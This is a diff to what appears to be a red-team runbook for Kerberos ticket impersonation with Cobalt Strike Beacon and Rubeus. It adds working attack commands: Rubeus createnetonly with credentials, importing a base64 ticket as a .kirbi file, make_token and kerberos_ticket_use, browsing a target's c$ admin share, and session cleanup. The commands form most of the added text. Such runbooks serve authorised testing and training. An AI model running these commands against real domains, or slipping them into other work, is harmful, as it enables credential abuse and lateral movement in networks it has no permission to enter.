@@ -58,6 +58,7 @@ Retain the complete ticket. `[...snip...]` output is illustrative and cannot be 
 
 ```shell
 # Create the separate network-only process and record the returned PID and LUID
+# Rubeus Alternative
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
 # Example: PID 2524 and LUID 0x132ef34; substitute actual returned values
 
@@ -169,6 +170,28 @@ VERIFY AND CLEAN UP
 [ ] rev2self → end impersonation
 [ ] kill <CREATED_PID> → only if this workflow created that process
 [ ] getuid → confirm the original Beacon context
+```
+
+## Ticket import alternatives
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
+```
+
+```shell
+# OPSEC Alternative
+beacon> make_token CONTOSO\rsteel FakePass
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
+beacon> run klist
+beacon> ls \\<TARGET_FQDN>\c$
+```
+
+```shell
+# BOF session cleanup: run while the disposable session is selected.
+beacon> krb_purge
+beacon> rev2self
+# Rubeus createnetonly path only: terminate its disposable process.
+beacon> kill <CREATED_PID>
 ```
 
 ## Related references
